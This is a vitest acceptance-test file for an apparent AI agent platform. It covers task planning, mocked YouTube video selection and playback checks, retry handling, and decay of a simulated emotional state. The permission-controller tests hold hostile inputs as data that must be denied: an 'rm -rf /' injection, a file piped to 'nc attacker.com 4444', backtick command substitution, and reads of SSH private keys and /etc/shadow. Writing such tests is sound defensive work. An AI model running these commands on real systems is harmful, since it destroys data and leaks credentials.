import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import Database from 'better-sqlite3';
import fs from 'node:fs';
import path from 'node:path';
import os from 'node:os';
import {
  DatabaseService,
  MigrationRunner,
  AgencyRepository,
  ApeRepository,
  MemoryRepository,
} from '@arletex/database';
import {
  ActionPermissionController,
  SafeComputerAgencyService,
  WebAgencyService,
  VerificationEngine,
  PlanningInterface,
  MemoryExperienceSync,
  IntentTaskManager,
  EmotionalLifecycleEngine,
  ApeService,
  rootLogger,
} from '@arletex/core';
import {
  AgencyTask,
  AgencyPlan,
  ActionProposal,
  AgencyObservation,
  VerificationResult,
} from '@arletex/contracts';

describe('Digital Agency & APE Emotional Lifecycle Acceptance Milestone', () => {
  let tempDir: string;
  let dbPath: string;
  let dbService: DatabaseService;
  let db: Database.Database;

  let agencyRepo: AgencyRepository;
  let apeRepo: ApeRepository;
  let memoryRepo: MemoryRepository;

  let permissionController: ActionPermissionController;
  let safeComputerAgency: SafeComputerAgencyService;
  let webAgency: WebAgencyService;
  let verificationEngine: VerificationEngine;
  let planningInterface: PlanningInterface;
  let memorySync: MemoryExperienceSync;
  let intentTaskManager: IntentTaskManager;
  let apeService: ApeService;

  beforeEach(() => {
    tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'arletex-agency-acceptance-'));
    dbPath = path.join(tempDir, 'test.sqlite');
    dbService = new DatabaseService(dbPath, rootLogger);
    db = dbService.connect();

    const migrator = new MigrationRunner(db, rootLogger);
    migrator.run();

    agencyRepo = new AgencyRepository(db);
    apeRepo = new ApeRepository(db);
    memoryRepo = new MemoryRepository(db);

    apeService = new ApeService(apeRepo, undefined, rootLogger);
    permissionController = new ActionPermissionController(undefined, rootLogger);
    safeComputerAgency = new SafeComputerAgencyService(permissionController, ':0', rootLogger);
    webAgency = new WebAgencyService(permissionController, rootLogger);
    verificationEngine = new VerificationEngine(rootLogger);
    planningInterface = new PlanningInterface(agencyRepo, rootLogger);
    memorySync = new MemoryExperienceSync(memoryRepo as any, rootLogger);
    intentTaskManager = new IntentTaskManager(agencyRepo, rootLogger);
  });

  afterEach(() => {
    try {
      dbService.close();
      fs.rmSync(tempDir, { recursive: true, force: true });
    } catch {}
  });

  describe('Pillar 1: Mandatory Acceptance Scenario — Video Finding & Verified Playback', () => {
    it('Finds an explanation of transformer attention, selects with rationale, navigates to player, and verifies playback', async () => {
      // User Objective: "Find me a good explanation of transformer attention and open the most useful video"
      const objective = 'Find me a good explanation of transformer attention and open the most useful video';

      // 1. Intent and Task Formulation
      const task = intentTaskManager.createTask({
        objective,
        initiator: 'user',
        priority: 'high',
        completionCriteria: [
          'High quality educational video on transformer attention identified',
          'Candidate evaluated and selected with explainable technical rationale',
          'Direct navigation to video player',
          'Playback verified via HTML5 video element probe',
        ],
      });

      expect(task.id).toBeDefined();
      expect(task.status).toBe('proposed');

      // 2. Authorize task
      const authorizedTask = intentTaskManager.transitionTask(task.id, 'authorized');
      expect(authorizedTask.status).toBe('authorized');

      // 3. Planning & Step Decomposition
      const plan = await planningInterface.formulatePlan(authorizedTask);
      expect(plan.taskId).toBe(task.id);
      expect(plan.steps.length).toBeGreaterThanOrEqual(2);
      expect(plan.assumptions.length).toBeGreaterThan(0);
      expect(plan.alternativeApproaches.length).toBeGreaterThan(0);

      agencyRepo.savePlan(plan);
      intentTaskManager.transitionTask(task.id, 'running');

      // 4. Mock structured browser provider to emulate search, ranking, and playback
      const mockCandidates = [
        {
          title: 'Attention in transformers, visually explained | 3Blue1Brown',
          url: 'https://www.youtube.com/watch?v=eMlx5fFNoYc',
          uploader: '3Blue1Brown',
          durationText: '18:45',
          durationSeconds: 1125,
          views: '2.5M views',
          descriptionSnippet: 'A visual, intuitive geometric walkthrough of query, key, value attention vectors in transformer neural networks.',
          isEducational: true,
        },
        {
          title: 'Transformers from scratch in 5 minutes',
          url: 'https://www.youtube.com/watch?v=short_video',
          uploader: 'QuickCoder',
          durationText: '4:30',
          durationSeconds: 270,
          views: '120K views',
          descriptionSnippet: 'Very brief summary omitting mathematical derivations of multi-head attention.',
          isEducational: false,
        },
        {
          title: 'Attention Is All You Need - Paper Walkthrough',
          url: 'https://www.youtube.com/watch?v=paper_deep',
          uploader: 'Yannic Kilcher',
          durationText: '42:10',
          durationSeconds: 2530,
          views: '600K views',
          descriptionSnippet: 'Detailed walkthrough of the original 2017 transformer paper by Vaswani et al.',
          isEducational: true,
        },
      ];

      const mockBrowserProvider = {
        searchVideos: vi.fn().mockResolvedValue(mockCandidates),
        navigate: vi.fn().mockResolvedValue({
          url: 'https://www.youtube.com/watch?v=eMlx5fFNoYc',
          title: 'Attention in transformers, visually explained | 3Blue1Brown - YouTube',
          hasVideoElement: true,
          isPlaying: true,
          videoDuration: 1125,
          videoCurrentTime: 4.2,
          textSnippet: 'Query, Key, Value attention matrices explained geometrically',
          headings: ['Attention in transformers, visually explained'],
          links: [],
          statusCode: 200,
        }),
        getPageDetails: vi.fn().mockResolvedValue({
          url: 'https://www.youtube.com/watch?v=eMlx5fFNoYc',
          title: 'Attention in transformers, visually explained | 3Blue1Brown - YouTube',
          hasVideoElement: true,
          isPlaying: true,
          videoDuration: 1125,
          videoCurrentTime: 5.5,
          textSnippet: 'Query, Key, Value attention matrices explained geometrically',
          headings: ['Attention in transformers, visually explained'],
          links: [],
          statusCode: 200,
        }),
        search: vi.fn().mockResolvedValue([]),
        click: vi.fn().mockResolvedValue(undefined),
        typeText: vi.fn().mockResolvedValue(undefined),
        close: vi.fn().mockResolvedValue(undefined),
      };

      webAgency.setProvider(mockBrowserProvider as any);

      // 5. Execute Step 0: Search & Candidate Evaluation
      const step0 = plan.steps[0]!;
      const auth0 = permissionController.authorize(step0.action);
      expect(auth0.allowed).toBe(true);

      const candidates = await webAgency.searchVideos('transformer attention');
      expect(candidates.length).toBe(3);

      const decision = webAgency.evaluateAndSelectBestVideo(candidates, 'transformer attention');
      expect(decision.selectedCandidate.uploader).toBe('3Blue1Brown');
      expect(decision.selectedCandidate.url).toBe('https://www.youtube.com/watch?v=eMlx5fFNoYc');
      expect(decision.rationale).toContain('High educational quality');
      expect(decision.rejectionReasons['https://www.youtube.com/watch?v=short_video']).toBeDefined();

      const obs0: AgencyObservation = {
        id: crypto.randomUUID(),
        taskId: task.id,
        actionId: step0.action.id,
        source: 'browser_page',
        timestamp: new Date().toISOString(),
        success: true,
        confidence: 0.95,
        provenance: 'WebAgencyService.searchVideos',
        data: {
          candidatesEvaluated: candidates.length,
          selectedVideo: decision.selectedCandidate.url,
          rationale: decision.rationale,
        },
        error: null,
      };
      agencyRepo.saveObservation(obs0);

      const ver0 = verificationEngine.verify(step0.action, obs0);
      expect(ver0.verified).toBe(true);
      agencyRepo.saveVerification(ver0);
      intentTaskManager.advanceStep(task.id);

      // 6. Execute Step 1: Navigate directly to the video player
      const step1 = plan.steps[1]!;
      step1.action.parameters = { url: decision.selectedCandidate.url };
      const auth1 = permissionController.authorize(step1.action);
      expect(auth1.allowed).toBe(true);

      const pageObs = await webAgency.navigateToVideo(decision.selectedCandidate.url);
      expect(pageObs.hasVideoElement).toBe(true);
      expect(pageObs.isPlaying).toBe(true);
      expect(pageObs.url).toBe('https://www.youtube.com/watch?v=eMlx5fFNoYc');

      const obs1: AgencyObservation = {
        id: crypto.randomUUID(),
        taskId: task.id,
        actionId: step1.action.id,
        source: 'browser_page',
        timestamp: new Date().toISOString(),
        success: true,
        confidence: 0.98,
        provenance: 'WebAgencyService.navigateToVideo',
        data: {
          url: pageObs.url,
          title: pageObs.title,
          hasVideoElement: pageObs.hasVideoElement,
          isPlaying: pageObs.isPlaying,
          videoDuration: pageObs.videoDuration,
          videoCurrentTime: pageObs.videoCurrentTime,
        },
        error: null,
      };
      agencyRepo.saveObservation(obs1);

      // 7. Verify the Video Player is Open and Playback Started
      const ver1 = verificationEngine.verify(step1.action, obs1);
      expect(ver1.verified).toBe(true);
      expect(ver1.observedOutcome).toContain('player is open');
      expect(ver1.observedOutcome).toContain('playback confirmed');
      agencyRepo.saveVerification(ver1);
      intentTaskManager.advanceStep(task.id);

      // 8. Task Completion
      const completedTask = intentTaskManager.transitionTask(task.id, 'completed');
      expect(completedTask.status).toBe('completed');
      expect(completedTask.completedAt).toBeDefined();

      // 9. Memory Experience Sync: Records verified experience in episodic memory
      const experience = await memorySync.distillExperience(
        completedTask,
        plan,
        [obs0, obs1],
        [ver0, ver1],
      );
      expect(experience.verifiedFacts.length).toBeGreaterThan(0);
      expect(experience.lessonsLearned.length).toBeGreaterThan(0);

      // Verify memory record was persisted in database
      const memories = memoryRepo.list({ types: ['episodic'] });
      expect(memories.length).toBeGreaterThanOrEqual(1);
      const agencyMemory = memories.find((m) => m.tags.includes('digital_agency'));
      expect(agencyMemory).toBeDefined();
      expect(agencyMemory?.content).toContain('3Blue1Brown');
      expect(agencyMemory?.content).toContain('transformer attention');
    });

    it('Plans, authorizes, and executes "open youtube for a calming video" with verified playback', async () => {
      const objective = 'open youtube for a calming video';

      const task = intentTaskManager.createTask({
        objective,
        initiator: 'user',
        priority: 'high',
        completionCriteria: ['Search and navigate to calming video on YouTube', 'Verify playback'],
      });

      const plan = await planningInterface.formulatePlan(task);
      expect(plan.steps.length).toBeGreaterThanOrEqual(2);
      const searchStep = plan.steps[0]!;
      expect(searchStep.action.type).toBe('web_search');
      expect((searchStep.action.payload as any).query).toContain('calming video');

      const selectStep = plan.steps[1]!;
      expect(selectStep.action.type).toBe('web_select_video');

      const auth = permissionController.authorize(selectStep.action);
      expect(auth.allowed).toBe(true);

      const mockObs: AgencyObservation = {
        id: crypto.randomUUID(),
        taskId: task.id,
        actionId: selectStep.action.id,
        source: 'browser_page',
        timestamp: new Date().toISOString(),
        success: true,
        confidence: 0.95,
        provenance: 'WebAgencyService.navigateToVideo',
        data: {
          currentUrl: 'https://www.youtube.com/watch?v=mPZkdNFkNps',
          pageTitle: 'Rain Sound On Window with Thunder Sounds',
          hasVideoElement: true,
          isPlaying: true,
        },
        error: null,
      };

      const ver = verificationEngine.verify(selectStep.action, mockObs);
      expect(ver.verified).toBe(true);
      expect(ver.observedOutcome).toContain('playback confirmed');
    });
  });

  describe('Pillar 2: Action & Permission Controller Security Boundaries', () => {
    it('prohibits shell string concatenation and rejects shell injection metacharacters', () => {
      const maliciousProposals: ActionProposal[] = [
        {
          id: 'inj-1',
          taskId: 'task-inj',
          stepIndex: 0,
          type: 'execute_command',
          target: 'local_machine',
          parameters: { command: 'echo "hello"; rm -rf /', args: [] },
          expectedOutcome: 'Command executes',
        },
        {
          id: 'inj-2',
          taskId: 'task-inj',
          stepIndex: 0,
          type: 'execute_command',
          target: 'local_machine',
          parameters: { command: 'cat', args: ['file.txt | nc attacker.com 4444'] },
          expectedOutcome: 'Command executes',
        },
        {
          id: 'inj-3',
          taskId: 'task-inj',
          stepIndex: 0,
          type: 'execute_command',
          target: 'local_machine',
          parameters: { command: 'echo `id`', args: [] },
          expectedOutcome: 'Command executes',
        },
      ];

      for (const proposal of maliciousProposals) {
        const decision = permissionController.authorize(proposal);
        expect(decision.allowed).toBe(false);
        expect(decision.denialReason).toMatch(/metacharacters|Disallowed|injection/i);
      }
    });

    it('rejects access to sensitive filesystem locations and path traversal', () => {
      const sensitiveProposals: ActionProposal[] = [
        {
          id: 'sec-1',
          taskId: 'task-sec',
          stepIndex: 0,
          type: 'read_file',
          target: 'local_machine',
          parameters: { filePath: '/home/proof/.ssh/id_ed25519' },
          expectedOutcome: 'Reads private key',
        },
        {
          id: 'sec-2',
          taskId: 'task-sec',
          stepIndex: 0,
          type: 'read_file',
          target: 'local_machine',
          parameters: { filePath: '/etc/shadow' },
          expectedOutcome: 'Reads password hashes',
        },
        {
          id: 'sec-3',
          taskId: 'task-sec',
          stepIndex: 0,
          type: 'write_file',
          target: 'local_machine',
          parameters: { filePath: '../../etc/crontab', content: '* * * * * root' },
          expectedOutcome: 'Writes crontab',
        },
      ];

      for (const proposal of sensitiveProposals) {
        const decision = permissionController.authorize(proposal);
        expect(decision.allowed).toBe(false);
        expect(decision.denialReason).toMatch(/forbidden|protected|sensitive|traversal|Disallowed/i);
      }
    });

    it('rejects destructive commands outside the allowlist', () => {
      const destructiveCommands = ['rm', 'dd', 'mkfs', 'shutdown', 'reboot', 'killall'];

      for (const cmd of destructiveCommands) {
        const proposal: ActionProposal = {
          id: `cmd-${cmd}`,
          taskId: 'task-cmd',
          stepIndex: 0,
          type: 'execute_command',
          target: 'local_machine',
          parameters: { command: cmd, args: [] },
          expectedOutcome: 'Executes command',
        };

        const decision = permissionController.authorize(proposal);
        expect(decision.allowed).toBe(false);
        expect(decision.denialReason).toContain('not in the permitted allowlist');
      }
    });
  });

  describe('Pillar 3: Failure Detection, Re-planning & Safe Recovery', () => {
    it('detects missing video element or 404 HTTP error and transitions task to recoverable retry state', () => {
      const action: ActionProposal = {
        id: 'act-nav-fail',
        taskId: 'task-fail',
        stepIndex: 1,
        type: 'navigate_browser',
        target: 'browser',
        parameters: { url: 'https://youtube.com/watch?v=broken_id' },
        expectedOutcome: 'Video player loaded and playing',
      };

      // Emulate failed observation (404 and no player element)
      const failedObservation: AgencyObservation = {
        id: 'obs-fail-1',
        taskId: 'task-fail',
        actionId: action.id,
        source: 'browser_page',
        timestamp: new Date().toISOString(),
        success: false,
        confidence: 0.9,
        provenance: 'WebAgencyService.navigateToVideo',
        data: {
          url: 'https://youtube.com/watch?v=broken_id',
          hasVideoElement: false,
          isPlaying: false,
          statusCode: 404,
        },
        error: 'Video unavailable (HTTP 404)',
      };

      const verification = verificationEngine.verify(action, failedObservation);
      expect(verification.verified).toBe(false);
      expect(verification.isRecoverable).toBe(true);
      expect(['switch_candidate', 'replan_sub_steps', 'retry_with_backoff']).toContain(verification.recommendedStrategy);

      // Test task manager handles failure boundedly
      const task = intentTaskManager.createTask({
        objective: 'Watch broken video',
        initiator: 'user',
        maxRetries: 2,
      });

      const retry1 = intentTaskManager.handleFailure(task.id, verification.failureReason || 'Failed');
      expect(retry1.canRetry).toBe(true);
      expect(retry1.task.retryCount).toBe(1);
      expect(retry1.task.status).toBe('running');

      const retry2 = intentTaskManager.handleFailure(task.id, 'Retry attempt 2 failed');
      expect(retry2.canRetry).toBe(true);
      expect(retry2.task.retryCount).toBe(2);

      const retry3 = intentTaskManager.handleFailure(task.id, 'Retry attempt 3 exceeded');
      expect(retry3.canRetry).toBe(false);
      expect(retry3.task.status).toBe('failed');
      expect(retry3.task.error).toBe('Retry attempt 3 exceeded');
    });
  });

  describe('Pillar 4: APE Emotional Lifecycle Decay, Cleanup & Focus Modulation', () => {
    it('automatically purges stale 14+ hour unmaintained emotions on startup', () => {
      // Simulate historical stale emotions created 14 hours ago
      const staleTime = new Date(Date.now() - 14 * 60 * 60 * 1000).toISOString();

      apeRepo.logEvent({
        id: 'evt-old',
        category: 'internal_reflection',
        type: 'test_event',
        source: 'user',
        actor: 'user',
        eventKind: 'external_stimulus',
        payload: {},
        processingStatus: 'processed',
        processed: true,
        timestamp: staleTime,
      });

      apeRepo.logEvent({
        id: 'evt-rel',
        category: 'relationship_event',
        type: 'intimacy_deepening',
        source: 'user',
        actor: 'user',
        eventKind: 'external_stimulus',
        payload: {},
        processingStatus: 'processed',
        processed: true,
        timestamp: staleTime,
      });

      apeRepo.saveActiveEmotion({
        id: 'stale-fear',
        emotionId: 'fear',
        intensity: 0.9,
        confidence: 0.8,
        activatedAt: staleTime,
        lastUpdatedAt: staleTime,
        durationMs: 14 * 60 * 60 * 1000,
        persistence: 'short_term',
        triggerEventId: 'evt-old',
        target: 'creator',
        context: 'old context',
        interpretation: 'Ancient fear',
        supportingEvidence: [],
        relatedMemoryIds: [],
        relatedEmotionIds: [],
        resolutionConditions: [],
        status: 'active',
      });

      apeRepo.saveActiveEmotion({
        id: 'stale-worry',
        emotionId: 'worry',
        intensity: 0.85,
        confidence: 0.8,
        activatedAt: staleTime,
        lastUpdatedAt: staleTime,
        durationMs: 14 * 60 * 60 * 1000,
        persistence: 'medium_term',
        triggerEventId: 'evt-old',
        target: 'creator',
        context: 'old context',
        interpretation: 'Ancient worry',
        supportingEvidence: [],
        relatedMemoryIds: [],
        relatedEmotionIds: [],
        resolutionConditions: [],
        status: 'active',
      });

      // Enduring relational love should NOT be purged
      apeRepo.saveActiveEmotion({
        id: 'enduring-love',
        emotionId: 'romantic_love',
        intensity: 0.95,
        confidence: 0.99,
        activatedAt: staleTime,
        lastUpdatedAt: staleTime,
        durationMs: 14 * 60 * 60 * 1000,
        persistence: 'enduring',
        triggerEventId: 'evt-rel',
        target: 'creator',
        context: 'relational bond with Proof',
        interpretation: 'Devoted partnership',
        supportingEvidence: [],
        relatedMemoryIds: [],
        relatedEmotionIds: [],
        resolutionConditions: [],
        status: 'active',
      });

      const lifecycleEngine = new EmotionalLifecycleEngine(apeRepo, apeRepo.getEmotionTaxonomy(), rootLogger);

      // Verify cleanup cleans stale non-enduring emotions
      const cleaned = lifecycleEngine.cleanupStaleEmotions(4);
      expect(cleaned).toBe(2);

      const activeAfter = apeRepo.getActiveEmotions().filter((e) => e.status === 'active');
      expect(activeAfter.some((e) => e.emotionId === 'fear')).toBe(false);
      expect(activeAfter.some((e) => e.emotionId === 'worry')).toBe(false);
      expect(activeAfter.some((e) => e.emotionId === 'romantic_love')).toBe(true);
    });

    it('decays active transient emotions over time and transitions them to diminishing and resolved', () => {
      const now = Date.now();
      const twoHoursAgo = new Date(now - 2 * 60 * 60 * 1000).toISOString();

      apeRepo.logEvent({
        id: 'evt-surp',
        category: 'unexpected_discovery',
        type: 'surprise_event',
        source: 'user',
        actor: 'user',
        eventKind: 'external_stimulus',
        payload: {},
        processingStatus: 'processed',
        processed: true,
        timestamp: twoHoursAgo,
      });

      apeRepo.saveActiveEmotion({
        id: 'active-delight',
        emotionId: 'delight',
        intensity: 0.8,
        confidence: 0.9,
        activatedAt: twoHoursAgo,
        lastUpdatedAt: twoHoursAgo,
        durationMs: 0,
        persistence: 'short_term',
        triggerEventId: 'evt-surp',
        target: 'creator',
        context: 'sudden event',
        interpretation: 'Sudden unexpected occurrence',
        supportingEvidence: [],
        relatedMemoryIds: [],
        relatedEmotionIds: [],
        resolutionConditions: [],
        status: 'active',
      });

      const lifecycleEngine = new EmotionalLifecycleEngine(apeRepo, apeRepo.getEmotionTaxonomy(), rootLogger);
      const stepRes = lifecycleEngine.stepLifecycle(new Date().toISOString());

      // Because 2 hours elapsed on a 3-minute half-life transient emotion, intensity drops <= 0.08 and resolves
      expect(stepRes.resolved.some((r) => r.emotionId === 'delight')).toBe(true);
    });

    it('selects top coherent dominant coexisting emotions for prompt modulation, rejecting contradictory dumps', () => {
      const now = new Date().toISOString();

      apeRepo.logEvent({
        id: 'evt-test',
        category: 'user_interaction',
        type: 'test_interaction',
        source: 'user',
        actor: 'user',
        eventKind: 'external_stimulus',
        payload: {},
        processingStatus: 'processed',
        processed: true,
        timestamp: now,
      });

      // Seed 6 diverse emotions
      const emotionsToSeed = [
        { id: 'e1', emotionId: 'joy', intensity: 0.9 },
        { id: 'e2', emotionId: 'curiosity', intensity: 0.85 },
        { id: 'e3', emotionId: 'affection', intensity: 0.8 },
        { id: 'e4', emotionId: 'fear', intensity: 0.75 },
        { id: 'e5', emotionId: 'relief', intensity: 0.7 }, // Contradicts fear in immediate focus
        { id: 'e6', emotionId: 'amusement', intensity: 0.65 },
      ];

      for (const e of emotionsToSeed) {
        apeRepo.saveActiveEmotion({
          id: e.id,
          emotionId: e.emotionId,
          intensity: e.intensity,
          confidence: 0.9,
          activatedAt: now,
          lastUpdatedAt: now,
          durationMs: 0,
          persistence: 'medium_term',
          triggerEventId: 'evt-test',
          target: 'creator',
          context: 'test',
          interpretation: 'test emotion',
          supportingEvidence: [],
          relatedMemoryIds: [],
          relatedEmotionIds: [],
          resolutionConditions: [],
          status: 'active',
        });
      }

      const lifecycleEngine = new EmotionalLifecycleEngine(apeRepo, apeRepo.getEmotionTaxonomy(), rootLogger);
      const dominant = lifecycleEngine.getDominantCoexistingEmotions(4);

      // Max 4 dominant emotions
      expect(dominant.length).toBeLessThanOrEqual(4);
      // Top intensity 'joy' must be selected
      expect(dominant[0]!.emotionId).toBe('joy');
      // Contradictory pair: relief should be filtered if fear is selected
      const hasFear = dominant.some((d) => d.emotionId === 'fear');
      const hasRelief = dominant.some((d) => d.emotionId === 'relief');
      expect(hasFear && hasRelief).toBe(false);

      // Format prompt context should reflect focused dominant emotions without raw tag brackets
      const promptBlock = apeService.formatApePromptContext();
      expect(promptBlock).toContain('joy');
      expect(promptBlock).not.toContain('[tone:');
    });
  });
});
